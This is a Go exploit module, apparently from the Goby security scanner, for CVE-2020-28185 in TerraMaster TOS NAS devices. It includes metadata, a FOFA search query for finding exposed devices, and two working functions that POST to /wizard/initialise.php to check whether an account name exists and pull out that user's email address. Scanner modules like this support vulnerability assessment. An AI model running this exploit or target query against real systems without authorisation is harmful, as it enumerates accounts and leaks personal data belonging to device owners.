package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"regexp"
)

func init() {
	expJson := `{
    "Name": "TerraMaster TOS initialise.php file Information Disclosure (CVE-2020-28185)",
    "Description": "<p>Based on a web interface, the TerraMaster Operating System (TOS) is the operating system designed for TNAS devices. With TOS, you can quickly and easily complete the following tasks:Modify system settings;Install and open applications;Manage TNAS storage space;</p><p>There is a information disclosure vulnerability in TOS.An attacker can exploit this vulnerability to obtain sensitive information on a website.</p>",
    "Impact": "<p>There is a information disclosure vulnerability in TOS.An attacker can exploit this vulnerability to obtain sensitive information on a website.</p>",
    "Recommendation": "<p>The manufacturer has provided the vulnerability patching solution, please pay attention to the manufacturer's homepage for timely updates: <a href=\"https://www.terra-master.com/\">https://www.terra-master.com /</a></p><p>1. Set access policies and whitelist access through security devices such as firewalls. </p><p>2. If not necessary, prohibit public network access to the system. </p>",
    "Product": "TerraMaster TOS",
    "VulType": [
        "Information Disclosure"
    ],
    "Tags": [
        "Information Disclosure"
    ],
    "Translation": {
        "CN": {
            "Name": "TerraMaster TOS initialise.php 文件信息泄露漏洞（CVE-2020-28185）",
            "Product": "TerraMaster TOS",
            "Description": "<p>TOS (TerraMaster Operating System) 是专门为 TNAS 设备设计的基于网页界面的操作系统。通过 TOS，您可以快速方便地进行修改系统设置、安装及打开应用程序、管理TNAS的存储空间等操作</p><p>TOS Web界面操作系统存在信息泄露漏洞，攻击者可利用该漏洞获取网站敏感信息。</p>",
            "Recommendation": "<p>厂商尚已提供漏洞修补方案，请关注厂商主页及时更新：<a href=\"https://www.terra-master.com/\">https://www.terra-master.com/</a></p><p>1、通过防⽕墙等安全设备设置访问策略，设置⽩名单访问。</p><p>2、如⾮必要，禁⽌公⽹访问该系统。</p>",
            "Impact": "<p>TOS Web界面操作系统存在信息泄露漏洞，攻击者可利用该漏洞获取网站敏感信息。<br></p>",
            "VulType": [
                "信息泄露"
            ],
            "Tags": [
                "信息泄露"
            ]
        },
        "EN": {
            "Name": "TerraMaster TOS initialise.php file Information Disclosure (CVE-2020-28185)",
            "Product": "TerraMaster TOS",
            "Description": "<p>Based on a web interface, the TerraMaster Operating System (TOS) is the operating system designed for TNAS devices. With TOS, you can quickly and easily complete the following tasks:Modify system settings;Install and open applications;Manage TNAS storage space;</p><p>There is a information disclosure vulnerability in TOS.An attacker can exploit this vulnerability to obtain sensitive information on a website.</p>",
            "Recommendation": "<p>The manufacturer has provided the vulnerability patching solution, please pay attention to the manufacturer's homepage for timely updates: <a href=\"https://www.terra-master.com/\">https://www.terra-master.com /</a></p><p>1. Set access policies and whitelist access through security devices such as firewalls. </p><p>2. If not necessary, prohibit public network access to the system. </p>",
            "Impact": "<p><span style=\"color: rgb(22, 51, 102); font-size: 16px;\">There is a information disclosure vulnerability in TOS.An attacker can exploit this vulnerability to obtain sensitive information on a website.</span><br></p>",
            "VulType": [
                "Information Disclosure"
            ],
            "Tags": [
                "Information Disclosure"
            ]
        }
    },
    "FofaQuery": "(((body=\"window.open('http://www.terra-master.com/','_blank');\" || (body=\"NAS Setup\" && body=\"X-UA-Compatible\" && body=\"nas.cgi\") || (title=\"TerraMaster\" && body=\"connfailed\") || ((body=\"class=\\\"cloud-logo\\\"\" || title=\"TerraMaster 系统管理\") && body=\"class=\\\"newlogo pngFix\\\"\")) && body!=\"Server: couchdb\") || banner=\"X-Powered-By: TerraMaster\")",
    "GobyQuery": "(((body=\"window.open('http://www.terra-master.com/','_blank');\" || (body=\"NAS Setup\" && body=\"X-UA-Compatible\" && body=\"nas.cgi\") || (title=\"TerraMaster\" && body=\"connfailed\") || ((body=\"class=\\\"cloud-logo\\\"\" || title=\"TerraMaster 系统管理\") && body=\"class=\\\"newlogo pngFix\\\"\")) && body!=\"Server: couchdb\") || banner=\"X-Powered-By: TerraMaster\")",
    "Author": "AnMing",
    "Homepage": "https://www.terra-master.com/",
    "DisclosureDate": "2022-03-01",
    "References": [
        "https://www.ihteam.net/advisory/terramaster-tos-multiple-vulnerabilities/"
    ],
    "HasExp": true,
    "Is0day": false,
    "Level": "1",
    "CVSS": "5.3",
    "CVEIDs": [
        "CVE-2020-28185"
    ],
    "CNVD": [
        "CNVD-2020-28185"
    ],
    "CNNVD": [
        "CNNVD-202012-1551"
    ],
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExpParams": [
        {
            "name": "userName",
            "type": "input",
            "value": "admin",
            "show": ""
        }
    ],
    "ExpTips": {
        "type": "",
        "content": ""
    },
    "AttackSurfaces": {
        "Application": [],
        "Support": [],
        "Service": [],
        "System": [],
        "Hardware": []
    },
    "PocId": "10259"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			url := "/wizard/initialise.php"
			cfg := httpclient.NewPostRequestConfig(url)
			cfg.VerifyTls = false
			cfg.Header.Store("Host", u.HostInfo)
			cfg.Header.Store("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:96.0) Gecko/20100101 Firefox/96.0")
			cfg.Header.Store("Referer", "http://"+u.HostInfo)
			cfg.Header.Store("Content-Type", "application/x-www-form-urlencoded")
			cfg.Data = "tab=checkuser&username=admin"
			if resp, err := httpclient.DoHttpRequest(u, cfg); err == nil {
				reg := regexp.MustCompile(`"status"`)
				result := reg.FindStringSubmatch(resp.Utf8Html)
				if len(result) > 0 {
					return true
				}
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			url := "/wizard/initialise.php"
			userName := ss.Params["userName"].(string)
			cfg := httpclient.NewPostRequestConfig(url)
			cfg.VerifyTls = false
			cfg.Header.Store("Host", expResult.HostInfo.HostInfo)
			cfg.Header.Store("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:96.0) Gecko/20100101 Firefox/96.0")
			cfg.Header.Store("Referer", "http://"+expResult.HostInfo.HostInfo)
			cfg.Header.Store("Content-Type", "application/x-www-form-urlencoded")
			cfg.Data = "tab=checkuser&username=" + userName
			if resp, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg); err == nil {
				reg := regexp.MustCompile(`"email":"(.*?)"`)
				regs := regexp.MustCompile(`"status"`)
				status := regs.FindStringSubmatch(resp.Utf8Html)
				result := reg.FindStringSubmatch(resp.Utf8Html)
				if len(status) > 0 {
					expResult.Success = true
					if result != nil {
						expResult.Output = "user:" + ss.Params["userName"].(string) + " email:" + result[1]
					} else {
						expResult.Output = "Not Found email about: " + ss.Params["userName"].(string)
					}
				}
			}
			return expResult
		},
	))
}
